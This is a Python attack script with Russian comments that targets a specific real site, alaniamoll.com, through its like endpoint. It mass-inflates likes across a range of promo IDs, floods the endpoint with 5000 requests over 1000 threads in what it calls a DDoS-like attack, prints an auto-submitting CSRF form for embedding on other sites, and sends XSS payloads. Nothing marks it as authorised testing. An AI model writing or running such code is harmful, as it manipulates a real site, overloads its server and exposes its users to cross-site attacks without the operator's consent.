import requests
import threading
import time
from concurrent.futures import ThreadPoolExecutor, as_completed


# ===== ЭКСПЛОИТАЦИЯ УЯЗВИМОСТЕЙ =====

def exploit_idor():
    """Массовая накрутка ВСЕХ промо через IDOR"""
    print("\n[=== МАССОВАЯ НАКРУТКА ВСЕХ ПРОМО ===]")

    def attack_promo(promo_id):
        try:
            response = requests.post(
                "https://alaniamoll.com/updates/add_like",
                data={'id': str(promo_id), 'prefix': 'promos'},
                headers={'X-Requested-With': 'XMLHttpRequest'},
                timeout=5
            )
            print(f"Промо #{promo_id}: {response.status_code} - {response.text}")
            return True
        except:
            return False

    # Атакуем диапазон промо
    successful = 0
    for promo_id in range(160, 171):  # 160-170
        if attack_promo(promo_id):
            successful += 1
        time.sleep(0.1)

    print(f"[+] Атаковано промо: {successful}")


def exploit_no_rate_limit():
    """Эксплуатация отсутствия лимитинга - MASSIVE ATTACK"""
    print("\n[=== MASSIVE DDoS-LIKE ATTACK ===]")

    def mass_request(request_id):
        try:
            session = requests.Session()
            # Быстрый запрос без лишних действий
            response = session.post(
                "https://alaniamoll.com/updates/add_like",
                data={'id': '163', 'prefix': 'promos'},
                timeout=3
            )
            if response.status_code == 200:
                return True
        except:
            pass
        return False

    # ЗАПУСКАЕМ 1000+ ПОТОКОВ
    successful = 0
    with ThreadPoolExecutor(max_workers=1000) as executor:
        futures = [executor.submit(mass_request, i) for i in range(1, 5001)]

        for future in futures:
            if future.result():
                successful += 1

    print(f"[+] MASS ATTACK: {successful}/5000 запросов")


def exploit_csrf():
    """Создание CSRF атаки для других пользователей"""
    print("\n[=== CSRF EXPLOIT ===]")

    # Генерируем CSRF payload для вставки на другие сайты
    csrf_payload = """
    <form action="https://alaniamoll.com/updates/add_like" method="POST" id="csrf">
        <input type="hidden" name="id" value="163">
        <input type="hidden" name="prefix" value="promos">
    </form>
    <script>document.getElementById('csrf').submit();</script>
    """

    print("CSRF payload для встраивания:")
    print(csrf_payload)

    # Автоматическая CSRF атака
    for i in range(10):
        try:
            response = requests.post(
                "https://alaniamoll.com/updates/add_like",
                data={'id': '163', 'prefix': 'promos'}
            )
            print(f"CSRF атака #{i + 1}: {response.status_code}")
        except:
            pass


def exploit_xss():
    """Эксплуатация XSS уязвимостей"""
    print("\n[=== XSS EXPLOIT ===]")

    xss_payloads = [
        "163<script>alert('XSS')</script>",
        "163' onerror='alert(\"XSS\")",
        "javascript:alert('HACKED')"
    ]

    for payload in xss_payloads:
        try:
            response = requests.post(
                "https://alaniamoll.com/updates/add_like",
                data={'id': payload, 'prefix': 'promos'},
                headers={'X-Requested-With': 'XMLHttpRequest'}
            )
            print(f"XSS payload: {payload} -> Status: {response.status_code}")
        except Exception as e:
            print(f"XSS error: {e}")


def full_exploitation():
    """Полная эксплуатация всех уязвимостей"""
    print("[=== ПОЛНАЯ ЭКСПЛОИТАЦИЯ УЯЗВИМОСТЕЙ ===]")

    exploits = [
        exploit_idor,
        exploit_no_rate_limit,
        exploit_csrf,
        exploit_xss
    ]

    for exploit in exploits:
        exploit()
        time.sleep(2)

    print("\n[=== ЭКСПЛОИТАЦИЯ ЗАВЕРШЕНА ===]")


if __name__ == "__main__":
    full_exploitation()